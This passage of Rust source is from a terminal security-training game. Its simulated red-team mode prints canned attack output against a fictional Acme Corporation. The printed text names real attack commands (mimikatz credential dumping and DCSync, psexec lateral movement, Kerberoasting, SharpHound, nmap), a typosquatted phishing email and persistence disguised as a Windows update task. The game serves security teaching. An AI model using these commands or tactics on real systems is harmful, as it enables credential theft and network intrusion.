                    "[SYSTEM] Nice try, but this isn't that kind of game.".to_string(),
                    "[SYSTEM] Also, who still stores passwords in /etc/shadow?".to_string(),
                    "[SYSTEM] It's 2025. Use a password manager.".to_string(),
                ]
            }

            "man" => {
                vec![
                    "[SYSTEM] What manual page do you want?".to_string(),
                    "[TIP] Try 'help' instead. This is a game, not Unix.".to_string(),
                    "[TIP] Though if you find the man page for incident response,".to_string(),
                    "[TIP] please share it with everyone.".to_string(),
                ]
            }

            "flag" | "ctf" | "capture the flag" => {
                self.game.player.find_easter_egg("ctf");
                vec![
                    "".to_string(),
                    "  🚩 CTF{1nc1d3nt_r3sp0ns3_1s_fun} 🚩".to_string(),
                    "".to_string(),
                    "[NOTE] This flag has no point value. Just like real CTFs.".to_string(),
                    "[NOTE] (Just kidding, CTFs are amazing)".to_string(),
                ]
            }

            "credits" | "about" => {
                vec![
                    "".to_string(),
                    "╔═══════════════════════════════════════════════════════════╗".to_string(),
                    "║                                                           ║".to_string(),
                    "║         INCIDENT RESPONSE: Chronicles                     ║".to_string(),
                    "║         of a Security Analyst                             ║".to_string(),
                    "║                                                           ║".to_string(),
                    "║         Created by: Cipher                                ║".to_string(),
                    "║         For: Ryan                                         ║".to_string(),
                    "║                                                           ║".to_string(),
                    "║         Built with: Rust + Ratatui                        ║".to_string(),
                    "║         Powered by: Coffee and determination              ║".to_string(),
                    "║                                                           ║".to_string(),
                    "║         \"Stay curious, stay vigilant.\"                    ║".to_string(),
                    "║                                                           ║".to_string(),
                    "╚═══════════════════════════════════════════════════════════╝".to_string(),
                    "".to_string(),
                ]
            }

            "version" | "ver" => {
                vec![
                    "[SYSTEM] Incident Response: Chronicles v1.0.0".to_string(),
                    "[SYSTEM] Build: 2025.01.06-release".to_string(),
                    "[SYSTEM] Rust Edition: 2021".to_string(),
                    "[SYSTEM] Threat Level: Elevated".to_string(),
                ]
            }

            _ => vec![
                format!("[ERROR] Unknown command: '{}'", parts[0]),
                "[TIP] Type 'help' for available commands".to_string(),
            ],
        }
    }

    /// Process Red Team specific commands
    fn process_red_team_command(&mut self, parts: &[&str]) -> Vec<String> {
        match parts[0] {
            "help" | "?" => vec![
                "╔══════════════════════════════════════════════════════════════╗".to_string(),
                "║              ☠️  RED TEAM COMMANDS                            ║".to_string(),
                "╠══════════════════════════════════════════════════════════════╣".to_string(),
                "║  RECONNAISSANCE:                                             ║".to_string(),
                "║    recon <target>     - Gather OSINT on target               ║".to_string(),
                "║    targets            - List potential targets               ║".to_string(),
                "║    portscan <ip>      - Scan target network ports            ║".to_string(),
                "║    bloodhound         - Run AD enumeration                   ║".to_string(),
                "╠──────────────────────────────────────────────────────────────╣".to_string(),
                "║  INITIAL ACCESS:                                             ║".to_string(),
                "║    phish <target>     - Send phishing email                  ║".to_string(),
                "║    social <target>    - Vishing/social engineering           ║".to_string(),
                "║    spray              - Password spray attack                ║".to_string(),
                "╠──────────────────────────────────────────────────────────────╣".to_string(),
                "║  POST-EXPLOITATION:                                          ║".to_string(),
                "║    dump <system>      - Dump credentials (mimikatz)          ║".to_string(),
                "║    creds              - View harvested credentials           ║".to_string(),
                "║    kerberoast         - Kerberoast service accounts          ║".to_string(),
                "║    pivot <system>     - Lateral movement to system           ║".to_string(),
                "║    implant <system>   - Deploy persistence                   ║".to_string(),
                "╠──────────────────────────────────────────────────────────────╣".to_string(),
                "║  EXFILTRATION:                                               ║".to_string(),
                "║    exfil <data>       - Exfiltrate data (finance/hr/all)     ║".to_string(),
                "╠──────────────────────────────────────────────────────────────╣".to_string(),
                "║  C2 & STATUS:                                                ║".to_string(),
                "║    status             - View operation status                ║".to_string(),
                "║    tools              - List available tools                 ║".to_string(),
                "║    stealth            - Check detection risk                 ║".to_string(),
                "║    clear              - Clear terminal                       ║".to_string(),
                "╚══════════════════════════════════════════════════════════════╝".to_string(),
            ],

            "clear" | "cls" => {
                self.command_output.clear();
                vec!["[C2] Terminal cleared.".to_string()]
            }

            "status" => {
                let stage = self.red_team_state.attack_stage.name();
                let access = match self.red_team_state.access_level {
                    0 => "None",
                    1 => "User",
                    2 => "Local Admin",
                    3 => "Domain Admin",
                    _ => "Unknown",
                };
                vec![
                    "┌─────────────────────────────────────────┐".to_string(),
                    "│         OPERATION STATUS                │".to_string(),
                    "├─────────────────────────────────────────┤".to_string(),
                    format!("│ Stage: {:<30} │", stage),
                    format!("│ Access Level: {:<23} │", access),
                    format!("│ Systems Owned: {:<22} │", self.red_team_state.compromised_systems.len()),
                    format!("│ Creds Harvested: {:<20} │", self.red_team_state.harvested_creds.len()),
                    format!("│ Detection Risk: {:<20} │", format!("{}%", self.red_team_state.detection_score)),
                    format!("│ Data Exfiltrated: {:<19} │", self.red_team_state.exfiltrated_data.len()),
                    "└─────────────────────────────────────────┘".to_string(),
                    "".to_string(),
                    if self.red_team_state.cover_blown {
                        "[ALERT] ⚠ YOUR COVER HAS BEEN BLOWN! ⚠".to_string()
                    } else if self.red_team_state.detection_score > 70 {
                        "[WARN] Detection risk is HIGH. Consider laying low.".to_string()
                    } else {
                        "[OK] Operating within acceptable risk parameters.".to_string()
                    },
                ]
            }

            "targets" => {
                vec![
                    "[INTEL] Known targets at Acme Corporation:".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "  👤 John Smith - Financial Analyst (jsmith@acme-corp.com)".to_string(),
                    "     └─ Handles vendor invoices, likely to open attachments".to_string(),
                    "  👤 Sarah Chen - IT Manager (schen@acme-corp.com)".to_string(),
                    "     └─ Has admin access, security-aware, harder target".to_string(),
                    "  👤 Michael Torres - CFO (mtorres@acme-corp.com)".to_string(),
                    "     └─ High value target, access to financial data".to_string(),
                    "  👤 Help Desk - IT Support (helpdesk@acme-corp.com)".to_string(),
                    "     └─ Can be social engineered for password resets".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "[TIP] Use 'recon <name>' for more intel".to_string(),
                ]
            }

            "recon" => {
                if parts.len() < 2 {
                    return vec![
                        "[ERROR] Usage: recon <target_name>".to_string(),
                        "[TIP] Use 'targets' to see available targets".to_string(),
                    ];
                }
                self.red_team_state.detection_score = (self.red_team_state.detection_score + 2).min(100);
                match parts[1].to_lowercase().as_str() {
                    "john" | "smith" | "jsmith" => vec![
                        "[RECON] Gathering OSINT on John Smith...".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "  Name: John Smith".to_string(),
                        "  Title: Financial Analyst".to_string(),
                        "  Email: jsmith@acme-corp.com".to_string(),
                        "  Workstation: WS-JSMITH (10.0.5.42)".to_string(),
                        "  LinkedIn: 'Handles AP/AR for Acme Corp'".to_string(),
                        "  Twitter: Posts about sports, not security-aware".to_string(),
                        "  Vendors: Works with Acme Suppliers Inc.".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[INTEL] High-value target. Likely to open invoice attachments.".to_string(),
                        "[INTEL] Consider typosquatting acme-suppliers domain.".to_string(),
                    ],
                    "sarah" | "chen" | "schen" => vec![
                        "[RECON] Gathering OSINT on Sarah Chen...".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "  Name: Sarah Chen".to_string(),
                        "  Title: IT Manager".to_string(),
                        "  Email: schen@acme-corp.com".to_string(),
                        "  Workstation: WS-SCHEN (10.0.5.10)".to_string(),
                        "  Has: Domain Admin privileges".to_string(),
                        "  LinkedIn: 'CISSP certified, 10 years in security'".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[WARN] High-risk target. Security professional.".to_string(),
                        "[WARN] Direct phishing unlikely to succeed.".to_string(),
                    ],
                    _ => vec![
                        format!("[RECON] No detailed intel on '{}'", parts[1]),
                        "[TIP] Use 'targets' to see known targets".to_string(),
                    ],
                }
            }

            "tools" => {
                vec![
                    "[C2] Available tools:".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "  🔧 nmap - Network scanner (recon)".to_string(),
                    "  🎣 phishing_kit - Email templates & tracking".to_string(),
                    "  🔑 mimikatz - Credential dumping".to_string(),
                    "  💀 cobalt_strike - C2 framework & beacon".to_string(),
                    "  🩸 bloodhound - AD enumeration".to_string(),
                    "  📧 gophish - Phishing campaigns".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                ]
            }

            "stealth" => {
                let risk = self.red_team_state.detection_score;
                let assessment = if risk < 20 {
                    ("LOW", "You're operating covertly. Keep it up.")
                } else if risk < 50 {
                    ("MEDIUM", "Some noise generated. Be more careful.")
                } else if risk < 80 {
                    ("HIGH", "SOC is investigating. Consider laying low.")
                } else {
                    ("CRITICAL", "They're onto you! Abort or go loud!")
                };
                vec![
                    format!("[STEALTH] Detection Risk Assessment: {}", assessment.0),
                    format!("[STEALTH] Score: {}%", risk),
                    format!("[STEALTH] {}", assessment.1),
                    "".to_string(),
                    "[FACTORS]".to_string(),
                    format!("  • Recon activities: +{}", (self.red_team_state.detection_score / 10).min(10)),
                    format!("  • Implants active: {}", self.red_team_state.implants_deployed.len()),
                    format!("  • C2 beacons: {}", if self.red_team_state.access_level > 0 { "Active" } else { "None" }),
                ]
            }

            "phish" => {
                if parts.len() < 2 {
                    return vec![
                        "[ERROR] Usage: phish <target>".to_string(),
                        "[TIP] Example: phish john".to_string(),
                    ];
                }
                if self.red_team_state.attack_stage == RedTeamStage::Reconnaissance {
                    self.red_team_state.attack_stage = RedTeamStage::WeaponizationDelivery;
                }
                self.red_team_state.detection_score = (self.red_team_state.detection_score + 15).min(100);

                match parts[1].to_lowercase().as_str() {
                    "john" | "smith" | "jsmith" => {
                        self.red_team_state.attack_stage = RedTeamStage::Exploitation;
                        self.red_team_state.access_level = 1;
                        self.red_team_state.compromised_systems.push("WS-JSMITH".to_string());
                        vec![
                            "[PHISH] Crafting phishing email...".to_string(),
                            "─────────────────────────────────────────────────────".to_string(),
                            "  From: invoices@acme-supp1iers.com".to_string(),
                            "  To: jsmith@acme-corp.com".to_string(),
                            "  Subject: Urgent: Invoice #INV-2024-4521 Requires Approval".to_string(),
                            "  Attachment: Invoice_Q4.xlsm [MACRO ENABLED]".to_string(),
                            "─────────────────────────────────────────────────────".to_string(),
                            "[PHISH] Email sent!".to_string(),
                            "[PHISH] Waiting for target to open...".to_string(),
                            "".to_string(),
                            "  ... 3 minutes later ...".to_string(),
                            "".to_string(),
                            "[SUCCESS] 🎯 TARGET EXECUTED PAYLOAD!".to_string(),
                            "[SUCCESS] Beacon established from WS-JSMITH (10.0.5.42)".to_string(),
                            "[SUCCESS] Initial access achieved! Access level: USER".to_string(),
                            "".to_string(),
                            "[WARN] Detection score increased. SOC might notice.".to_string(),
                            "[TIP] Use 'dump WS-JSMITH' to harvest credentials".to_string(),
                        ]
                    }
                    "sarah" | "chen" | "schen" => vec![
                        "[PHISH] Crafting phishing email...".to_string(),
                        "[PHISH] Email sent to schen@acme-corp.com".to_string(),
                        "".to_string(),
                        "  ... 5 minutes later ...".to_string(),
                        "".to_string(),
                        "[FAILED] Target did not click. Security awareness training working.".to_string(),
                        "[INTEL] Sarah Chen reported email to IT Security.".to_string(),
                        "[WARN] Detection score significantly increased!".to_string(),
                    ],
                    _ => vec![
                        format!("[ERROR] Unknown target: {}", parts[1]),
                        "[TIP] Use 'targets' to see available targets".to_string(),
                    ],
                }
            }

            "dump" => {
                if parts.len() < 2 {
                    return vec!["[ERROR] Usage: dump <system>".to_string()];
                }
                if !self.red_team_state.compromised_systems.iter().any(|s| s.to_lowercase().contains(&parts[1].to_lowercase())) {
                    return vec![
                        format!("[ERROR] No access to system: {}", parts[1]),
                        "[TIP] You need to compromise a system first".to_string(),
                    ];
                }
                self.red_team_state.detection_score = (self.red_team_state.detection_score + 20).min(100);
                self.red_team_state.harvested_creds.push(("jsmith".to_string(), "aad3b435...".to_string()));
                self.red_team_state.harvested_creds.push(("ACME\\svc_backup".to_string(), "5f4dcc3b...".to_string()));
                vec![
                    "[DUMP] Running mimikatz on target...".to_string(),
                    "[DUMP] sekurlsa::logonpasswords".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "[CRED] jsmith : ACME : aad3b435b51404eeaad3b435b51404ee".to_string(),
                    "[CRED] ACME\\svc_backup : 5f4dcc3b5aa765d61d8327deb882cf99".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "[SUCCESS] 2 credentials harvested!".to_string(),
                    "[INTEL] svc_backup is a service account - likely has elevated privs".to_string(),
                    "[WARN] EDR might detect mimikatz. Detection risk increased.".to_string(),
                ]
            }

            "creds" => {
                if self.red_team_state.harvested_creds.is_empty() {
                    return vec![
                        "[CREDS] No credentials harvested yet.".to_string(),
                        "[TIP] Compromise a system and use 'dump <system>'".to_string(),
                    ];
                }
                let mut output = vec![
                    "[CREDS] Harvested credentials:".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                ];
                for (user, hash) in &self.red_team_state.harvested_creds {
                    output.push(format!("  {} : {}", user, hash));
                }
                output.push("─────────────────────────────────────────────────────".to_string());
                output
            }

            "pivot" | "lateral" => {
                if parts.len() < 2 {
                    return vec!["[ERROR] Usage: pivot <target_system>".to_string()];
                }
                if self.red_team_state.harvested_creds.is_empty() {
                    return vec![
                        "[ERROR] No credentials available for lateral movement".to_string(),
                        "[TIP] Use 'dump <system>' to harvest credentials first".to_string(),
                    ];
                }
                self.red_team_state.attack_stage = RedTeamStage::LateralMovement;
                self.red_team_state.detection_score = (self.red_team_state.detection_score + 15).min(100);

                match parts[1].to_lowercase().as_str() {
                    "srv-fs01" | "fileserver" | "fs01" => {
                        self.red_team_state.compromised_systems.push("SRV-FS01".to_string());
                        self.red_team_state.access_level = 2;
                        vec![
                            "[PIVOT] Using svc_backup credentials...".to_string(),
                            "[PIVOT] psexec.exe \\\\SRV-FS01 -u ACME\\svc_backup".to_string(),
                            "".to_string(),
                            "[SUCCESS] 🎯 Access granted to SRV-FS01!".to_string(),
                            "[SUCCESS] File server compromised. Access level: LOCAL ADMIN".to_string(),
                            "[INTEL] Found shares: \\\\SRV-FS01\\Finance$, \\\\SRV-FS01\\HR$".to_string(),
                            "[TIP] Use 'exfil finance' to steal financial data".to_string(),
                        ]
                    }
                    "srv-dc01" | "dc" | "dc01" => {
                        self.red_team_state.compromised_systems.push("SRV-DC01".to_string());
                        self.red_team_state.access_level = 3;
                        vec![
                            "[PIVOT] Attempting DCSync attack...".to_string(),
                            "[PIVOT] mimikatz # lsadump::dcsync /domain:acme.corp".to_string(),
                            "".to_string(),
                            "[SUCCESS] 🎯 DOMAIN ADMIN ACHIEVED!".to_string(),
                            "[SUCCESS] Full domain compromise. You own the network.".to_string(),
                            "[LOOT] krbtgt hash: 2e8a5d...".to_string(),
                            "[LOOT] Administrator hash: e19ccf...".to_string(),
                            "[WARN] Major detection risk! SOC will likely notice.".to_string(),
                        ]
                    }
                    _ => vec![
                        format!("[ERROR] Unknown or inaccessible system: {}", parts[1]),
                        "[TIP] Available targets: SRV-FS01, SRV-DC01".to_string(),
                    ],
                }
            }

            "implant" => {
                if parts.len() < 2 {
                    return vec!["[ERROR] Usage: implant <system>".to_string()];
                }
                if !self.red_team_state.compromised_systems.iter().any(|s| s.to_lowercase().contains(&parts[1].to_lowercase())) {
                    return vec![format!("[ERROR] No access to system: {}", parts[1])];
                }
                self.red_team_state.attack_stage = RedTeamStage::Installation;
                self.red_team_state.detection_score = (self.red_team_state.detection_score + 10).min(100);
                self.red_team_state.implants_deployed.push(parts[1].to_string());
                vec![
                    format!("[IMPLANT] Deploying persistence on {}...", parts[1]),
                    "[IMPLANT] Creating scheduled task 'WindowsUpdate'...".to_string(),
                    "[IMPLANT] Adding registry run key...".to_string(),
                    "[IMPLANT] Establishing C2 beacon (HTTPS/443)...".to_string(),
                    "".to_string(),
                    "[SUCCESS] Persistence established!".to_string(),
                    "[SUCCESS] System will beacon every 60 seconds.".to_string(),
                ]
            }

            "exfil" | "exfiltrate" => {
                if parts.len() < 2 {
                    return vec![
                        "[ERROR] Usage: exfil <data_type>".to_string(),
                        "[TIP] Types: finance, hr, emails, all".to_string(),
                    ];
                }
                if !self.red_team_state.compromised_systems.contains(&"SRV-FS01".to_string()) &&
                   self.red_team_state.access_level < 2 {
                    return vec![
                        "[ERROR] Need access to file server to exfiltrate data".to_string(),
                        "[TIP] Pivot to SRV-FS01 first".to_string(),
                    ];
                }
                self.red_team_state.attack_stage = RedTeamStage::Exfiltration;
                self.red_team_state.detection_score = (self.red_team_state.detection_score + 25).min(100);

                match parts[1].to_lowercase().as_str() {
                    "finance" | "financial" => {
                        self.red_team_state.exfiltrated_data.push("Q4_Financials.xlsx".to_string());
                        self.red_team_state.exfiltrated_data.push("Budget_2025.xlsx".to_string());
                        self.red_team_state.attack_stage = RedTeamStage::Complete;
                        vec![
                            "[EXFIL] Accessing \\\\SRV-FS01\\Finance$...".to_string(),
                            "[EXFIL] Compressing data with 7zip...".to_string(),
                            "[EXFIL] Encrypting archive...".to_string(),
                            "[EXFIL] Uploading to C2 server via HTTPS...".to_string(),
                            "─────────────────────────────────────────────────────".to_string(),
                            "[EXFIL] Files exfiltrated:".to_string(),
                            "  • Q4_Financials.xlsx (2.3 MB)".to_string(),
                            "  • Budget_2025.xlsx (1.1 MB)".to_string(),
                            "  • Payroll_Data.csv (500 KB)".to_string(),
                            "─────────────────────────────────────────────────────".to_string(),
                            "".to_string(),
                            "╔══════════════════════════════════════════════════════╗".to_string(),
                            "║        🎯  MISSION ACCOMPLISHED!  🎯                 ║".to_string(),
                            "║                                                      ║".to_string(),
                            "║  Financial data has been exfiltrated successfully.  ║".to_string(),
                            "║  Reward: $500,000 BTC transferred to your wallet.   ║".to_string(),
                            "║                                                      ║".to_string(),
                            "║  Final Stats:                                        ║".to_string(),
                            format!("║    Systems Compromised: {:<25} ║", self.red_team_state.compromised_systems.len()),
                            format!("║    Credentials Harvested: {:<23} ║", self.red_team_state.harvested_creds.len()),
                            format!("║    Detection Score: {:<28} ║", format!("{}%", self.red_team_state.detection_score)),
                            "║                                                      ║".to_string(),
                            "╚══════════════════════════════════════════════════════╝".to_string(),
                        ]
                    }
                    _ => vec![
                        format!("[ERROR] Unknown data type: {}", parts[1]),
                        "[TIP] Available: finance, hr, emails".to_string(),
                    ],
                }
            }

            "social" | "vish" | "vishing" => {
                if parts.len() < 2 {
                    return vec![
                        "[ERROR] Usage: social <target>".to_string(),
                        "[TIP] Try social engineering via phone".to_string(),
                    ];
                }
                self.red_team_state.detection_score = (self.red_team_state.detection_score + 5).min(100);
                match parts[1].to_lowercase().as_str() {
                    "helpdesk" | "help" | "it" => vec![
                        "[SOCIAL] Calling Acme Corp Help Desk...".to_string(),
                        "".to_string(),
                        "Help Desk: \"IT Support, how can I help you?\"".to_string(),
                        "".to_string(),
                        "You: \"Hi, this is John from Finance. I'm locked out".to_string(),
                        "     of my account and have an urgent deadline.\"".to_string(),
                        "".to_string(),
                        "Help Desk: \"Sure, let me verify your identity.".to_string(),
                        "           What's your employee ID?\"".to_string(),
                        "".to_string(),
                        "You: \"It's... uh... I don't have it on me. Look,".to_string(),
                        "     I really need this done quickly.\"".to_string(),
                        "".to_string(),
                        "Help Desk: \"I'm sorry, but I need to verify your".to_string(),
                        "           identity before resetting passwords.\"".to_string(),
                        "".to_string(),
                        "[FAILED] Help desk followed proper procedures.".to_string(),
                        "[INTEL] They have security awareness training.".to_string(),
                    ],
                    _ => vec![
                        format!("[ERROR] Unknown target for social engineering: {}", parts[1]),
                    ],
                }
            }

            // Port scanning
            "portscan" | "nmap" | "scan" => {
                if parts.len() < 2 {
                    return vec![
                        "[ERROR] Usage: portscan <ip or subnet>".to_string(),
                        "[TIP] Example: portscan 10.0.5.0/24".to_string(),
                    ];
                }
                self.red_team_state.detection_score = (self.red_team_state.detection_score + 8).min(100);
                vec![
                    format!("[NMAP] Starting port scan of {}...", parts[1]),
                    "[NMAP] nmap -sS -sV -p- --min-rate 1000".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "".to_string(),
                    "Discovered hosts:".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "  10.0.5.1    (gw-core)     - Cisco ASA Firewall".to_string(),
                    "  10.0.5.10   (WS-SCHEN)    - Windows 10 [IT Manager]".to_string(),
                    "  10.0.5.42   (WS-JSMITH)   - Windows 10 [Finance] ★ TARGET".to_string(),
                    "  10.0.5.50   (SRV-DC01)    - Windows Server 2019 [Domain Controller]".to_string(),
                    "  10.0.5.51   (SRV-FS01)    - Windows Server 2019 [File Server]".to_string(),
                    "  10.0.5.52   (SRV-SQL01)   - Windows Server 2019 [Database]".to_string(),
                    "  10.0.5.53   (SRV-EXCH01)  - Windows Server 2019 [Exchange]".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "".to_string(),
                    "[INTEL] Interesting ports on SRV-DC01:".to_string(),
                    "  53/tcp   - DNS".to_string(),
                    "  88/tcp   - Kerberos".to_string(),
                    "  389/tcp  - LDAP".to_string(),
                    "  445/tcp  - SMB".to_string(),
                    "  636/tcp  - LDAPS".to_string(),
                    "  3268/tcp - Global Catalog".to_string(),
                    "".to_string(),
                    "[WARN] Port scanning generates network noise!".to_string(),
                    "[WARN] IDS may detect - detection score increased.".to_string(),
                ]
            }

            // BloodHound AD enumeration
            "bloodhound" | "sharphound" | "bh" => {
                if self.red_team_state.access_level < 1 {
                    return vec![
                        "[ERROR] Need initial access to run BloodHound".to_string(),
                        "[TIP] Get a foothold first with 'phish' or 'spray'".to_string(),
                    ];
                }
                self.red_team_state.detection_score = (self.red_team_state.detection_score + 15).min(100);
                vec![
                    "[BLOODHOUND] Running SharpHound collector...".to_string(),
                    "[BLOODHOUND] Invoke-BloodHound -CollectionMethod All".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "".to_string(),
                    "[COLLECTION] Enumerating Domain: ACME.CORP".to_string(),
                    "[COLLECTION] Domain Controllers: 1".to_string(),
                    "[COLLECTION] Users: 247".to_string(),
                    "[COLLECTION] Groups: 89".to_string(),
                    "[COLLECTION] Computers: 156".to_string(),
                    "[COLLECTION] GPOs: 12".to_string(),
                    "[COLLECTION] Sessions: 34".to_string(),
                    "".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "[ANALYSIS] Attack Paths to Domain Admin:".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "".to_string(),
                    "  PATH 1 (SHORTEST):".to_string(),
                    "  jsmith@ACME.CORP".to_string(),
                    "    │ [MemberOf]".to_string(),
                    "    ▼".to_string(),
                    "  Finance Users@ACME.CORP".to_string(),
                    "    │ [CanRDP]".to_string(),
                    "    ▼".to_string(),
                    "  SRV-FS01.ACME.CORP".to_string(),
                    "    │ [HasSession]".to_string(),
                    "    ▼".to_string(),
                    "  svc_backup@ACME.CORP  ★ SERVICE ACCOUNT".to_string(),
                    "    │ [MemberOf]".to_string(),
                    "    ▼".to_string(),
                    "  Backup Operators@ACME.CORP".to_string(),
                    "    │ [DCSync Rights]".to_string(),
                    "    ▼".to_string(),
                    "  Domain Admins@ACME.CORP  🎯".to_string(),
                    "".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "[INTEL] svc_backup has DCSync rights!".to_string(),
                    "[INTEL] Capture these creds to become Domain Admin".to_string(),
                    "[WARN] SharpHound makes LDAP queries - may trigger SIEM".to_string(),
                ]
            }

            // Password spray attack
            "spray" | "passwordspray" => {
                self.red_team_state.detection_score = (self.red_team_state.detection_score + 20).min(100);
                vec![
                    "[SPRAY] Initiating password spray attack...".to_string(),
                    "[SPRAY] Testing common passwords against AD users".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "".to_string(),
                    "[TESTING] Password: Summer2024!".to_string(),
                    "  acme\\jsmith     - FAILED".to_string(),
                    "  acme\\schen      - FAILED".to_string(),
                    "  acme\\mtorres    - FAILED".to_string(),
                    "  ...".to_string(),
                    "[TESTING] Password: Welcome123".to_string(),
                    "  acme\\jsmith     - FAILED".to_string(),
                    "  acme\\schen      - FAILED".to_string(),
                    "  ...".to_string(),
                    "[TESTING] Password: Acme2024!".to_string(),
                    "  acme\\jsmith     - FAILED".to_string(),
                    "  acme\\intern01   - SUCCESS! ★".to_string(),
                    "".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "[SUCCESS] Valid credentials found!".to_string(),
                    "[CRED] intern01 : Acme2024!".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "".to_string(),
                    "[INTEL] intern01 is a low-privilege account".to_string(),
                    "[INTEL] Can be used for initial foothold".to_string(),
                    "[WARN] ⚠ Account lockout threshold may be triggered!".to_string(),
                    "[WARN] ⚠ High detection risk - multiple auth failures logged".to_string(),
                ]
            }

            // Kerberoasting attack
            "kerberoast" | "roast" => {
                if self.red_team_state.access_level < 1 {
                    return vec![
                        "[ERROR] Need domain access to Kerberoast".to_string(),
                        "[TIP] Get initial access first".to_string(),
                    ];
                }
                self.red_team_state.detection_score = (self.red_team_state.detection_score + 12).min(100);
                self.red_team_state.harvested_creds.push(("svc_sql".to_string(), "$krb5tgs$23$*svc_sql$...".to_string()));
                vec![
                    "[KERBEROAST] Requesting TGS tickets for SPNs...".to_string(),
                    "[KERBEROAST] Invoke-Kerberoast -OutputFormat Hashcat".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "".to_string(),
                    "[SPN FOUND] MSSQLSvc/SRV-SQL01.acme.corp:1433".to_string(),
                    "  Account: svc_sql".to_string(),
                    "  Delegation: Unconstrained".to_string(),
                    "".to_string(),
                    "[SPN FOUND] HTTP/SRV-EXCH01.acme.corp".to_string(),
                    "  Account: svc_exchange".to_string(),
                    "  Delegation: Constrained".to_string(),
                    "".to_string(),
                    "[EXTRACTED] TGS-REP Hashes:".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "$krb5tgs$23$*svc_sql$ACME.CORP$MSSQLSvc/SRV-SQL01*$8a7b...".to_string(),
                    "$krb5tgs$23$*svc_exchange$ACME.CORP$HTTP/SRV-EXCH01*$c3d2...".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                    "".to_string(),
                    "[CRACK] Running hashcat mode 13100...".to_string(),
                    "[CRACK] svc_sql : SQLAdmin2024!".to_string(),
                    "[CRACK] svc_exchange - NOT CRACKED (strong password)".to_string(),
                    "".to_string(),
                    "[SUCCESS] Credentials harvested!".to_string(),
                    "[INTEL] svc_sql has access to database server".to_string(),
                    "[TIP] Use 'pivot srv-sql01' to move to database".to_string(),
                ]
            }

            // whoami for Red Team
            "whoami" | "id" => {
                let access = match self.red_team_state.access_level {
                    0 => "No access (external)",
                    1 => "ACME\\jsmith (User)",
                    2 => "ACME\\svc_backup (Local Admin)",
                    3 => "ACME\\Administrator (Domain Admin)",
                    _ => "Unknown",
                };
                vec![
                    format!("[C2] Current access: {}", access),
                    format!("[C2] Systems owned: {}", self.red_team_state.compromised_systems.len()),
                    format!("[C2] Detection risk: {}%", self.red_team_state.detection_score),
                ]
            }

            // List compromised systems
            "owned" | "systems" | "shells" => {
                if self.red_team_state.compromised_systems.is_empty() {
                    return vec![
                        "[C2] No systems compromised yet.".to_string(),
                        "[TIP] Use 'phish' or 'spray' to gain initial access".to_string(),
                    ];
                }
                let mut output = vec![
                    "[C2] Compromised systems:".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                ];
                for (i, sys) in self.red_team_state.compromised_systems.iter().enumerate() {
                    let beacon = if i == 0 { "★ ACTIVE" } else { "  ACTIVE" };
                    output.push(format!("  {} {} - Beacon {}", beacon, sys, i + 1));
                }
                output.push("─────────────────────────────────────────────────────".to_string());
                output.push("[TIP] Use 'pivot <system>' to move laterally".to_string());
                output
            }

            // Red Team score
            "score" | "points" => {
                let score = &self.game.player.score;
                let stealth_rating = match self.red_team_state.detection_score {
                    d if d < 20 => "GHOST 👻",
                    d if d < 40 => "STEALTH",
                    d if d < 60 => "COVERT",
                    d if d < 80 => "NOISY",
                    _ => "DETECTED! ⚠",
                };
                vec![
                    "╔══════════════════════════════════════════════════════════════╗".to_string(),
                    "║                    ☠️  OPERATION SCORE ☠️                      ║".to_string(),
                    "╠══════════════════════════════════════════════════════════════╣".to_string(),
                    format!("║  Total Points: {:<41} ║", format!("{} pts", score.total_points)),
                    format!("║  Stealth Rating: {:<39} ║", stealth_rating),
                    format!("║  Detection Score: {:<38} ║", format!("{}%", self.red_team_state.detection_score)),
                    "╠──────────────────────────────────────────────────────────────╣".to_string(),
                    "║  BREAKDOWN:                                                  ║".to_string(),
                    format!("║    Systems compromised:   {:<5} (+{} pts)                 ║",
                           score.systems_compromised, score.systems_compromised * 100),
                    format!("║    Creds harvested:       {:<5} (+{} pts)                 ║",
                           score.credentials_harvested, score.credentials_harvested * 150),
                    format!("║    Data exfiltrated:      {:<5} (+{} pts)                 ║",
                           score.data_exfiltrated, score.data_exfiltrated * 200),
                    format!("║    Persistence:           {:<5} (+{} pts)                 ║",
                           score.persistence_established, score.persistence_established * 100),
                    "╠──────────────────────────────────────────────────────────────╣".to_string(),
                    "║  OBJECTIVES:                                                 ║".to_string(),
                    format!("║    [{}] Gain initial access                                ║",
                           if self.red_team_state.access_level >= 1 { "✓" } else { " " }),
                    format!("║    [{}] Escalate to local admin                            ║",
                           if self.red_team_state.access_level >= 2 { "✓" } else { " " }),
                    format!("║    [{}] Achieve Domain Admin                               ║",
                           if self.red_team_state.access_level >= 3 { "✓" } else { " " }),
                    format!("║    [{}] Exfiltrate sensitive data                          ║",
                           if !self.red_team_state.exfiltrated_data.is_empty() { "✓" } else { " " }),
                    "╚══════════════════════════════════════════════════════════════╝".to_string(),
                ]
            }

            _ => vec![
                format!("[ERROR] Unknown command: '{}'", parts[0]),
                "[TIP] Type 'help' for available commands".to_string(),
            ],
        }
    }

    /// Show achievements
